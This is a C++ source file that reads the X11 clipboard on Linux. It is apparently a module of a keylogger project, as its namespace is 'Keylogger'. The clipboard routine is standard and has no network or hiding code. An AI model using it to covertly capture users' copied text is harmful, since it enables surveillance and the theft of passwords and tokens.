#ifdef __linux__

#include "ClipboardHandlerLinuxX11.h"

#include <X11/Xlib.h>

#include <climits>

namespace Keylogger {

// https://stackoverflow.com/a/44992938
std::string getSelection(Display* display, Window window, const char* bufname, const char* fmtname) {
    std::string selection;
    char *result;
    unsigned long ressize, restail;
    int resbits;
    Atom bufId = XInternAtom(display, bufname, false);
    Atom fmtId = XInternAtom(display, fmtname, false);
    Atom propId = XInternAtom(display, "XSEL_DATA", false);
    Atom incrId = XInternAtom(display, "INCR", false);
    XEvent event;

    XSelectInput (display, window, PropertyChangeMask);
    XConvertSelection(display, bufId, fmtId, propId, window, CurrentTime);

    do {
        XNextEvent(display, &event);
    } while (event.type != SelectionNotify || event.xselection.selection != bufId);

    if (event.xselection.property) {
        XGetWindowProperty(
            display,
            window,
            propId,
            0,
            LONG_MAX / 4,
            true,
            AnyPropertyType,
            &fmtId,
            &resbits,
            &ressize,
            &restail,
            (unsigned char**)&result
        );
        if (fmtId != incrId) {
            selection += result;
        }
        XFree(result);

        if (fmtId == incrId) {
            do {
                do {
                    XNextEvent(display, &event);
                } while (event.type != PropertyNotify || event.xproperty.atom != propId || event.xproperty.state != PropertyNewValue);

                XGetWindowProperty(
                    display,
                    window,
                    propId,
                    0,
                    LONG_MAX / 4,
                    true,
                    AnyPropertyType,
                    &fmtId,
                    &resbits,
                    &ressize,
                    &restail,
                    (unsigned char**)&result
                );
                selection += result;
                XFree(result);
            } while (ressize > 0);
        }
        return selection;
    }
    return "";
}

std::string ClipboardHandlerLinuxX11::getClipboardString() {
    Display* display = XOpenDisplay(NULL);
    int black = BlackPixel(display, DefaultScreen(display));
    Window window = XCreateSimpleWindow(display, XDefaultRootWindow(display), 0, 0, 1, 1, 0, black, black);

    std::string result = getSelection(display, window, "CLIPBOARD", "UTF8_STRING");
    XCloseDisplay(display);
    return result;
}

}

#endif // defined(__linux__)
